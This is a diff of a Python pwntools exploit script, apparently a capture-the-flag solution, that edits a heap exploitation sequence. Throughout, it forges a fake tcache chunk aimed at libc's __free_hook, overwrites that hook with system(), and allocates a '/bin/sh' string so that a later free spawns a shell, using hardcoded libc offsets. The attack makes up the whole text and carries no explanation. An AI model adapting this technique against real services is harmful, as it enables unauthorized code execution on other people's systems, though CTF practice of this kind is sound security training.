@@ -63,28 +63,23 @@ else:
     exit()
     
 #make fake tcache 
-edit(0, -1, 'a\n')
+free_hook = libc_base + 0x3ed8e8
+payload = p64(0) + p64(0x31)+p64(free_hook)+p64(0) * 4+p64(0x31)
+edit(0, 0x100, payload+'\n')
+
 payload = 'd'*0xfd0 + p32(0x100) + p32(1) + p64(0xdeaddeaf040)
 add('c', 0x1100, payload+'\n')
 p.send(p64(0xdeaddead000))
 p.send(p64(0xdeaddead000))
 p.send(p64(0)*4)
+
 payload = p64(0)+p64(0x31)+p64(0) * 5+p64(0x31)
 edit(5, 0x100, payload+'\n')
 remove(0)
 
-free_hook = libc_base + 0x3ed8e8
-payload = p64(0) + p64(0x31)+p64(free_hook)+p64(0) * 4+p64(0x31)
-edit(5, 0x100, payload+'\n')
-
-add('a', 0xf00, 'a\n')
-p.send(p64(0xbeefdead000))
-p.send(p64(0xbeefdead000))
-p.send(p64(0)*4)
-
 #overwrite free_hook
 system = libc_base+0x4f440
-add('a', 0xf00, '/bin/sh\x00\n')
+add('a', 0x20, '/bin/sh\x00\n')
 p.send(p64(0xbeefdead000))
 p.send(p64(0xbeefdead000))
 p.send(p64(system))
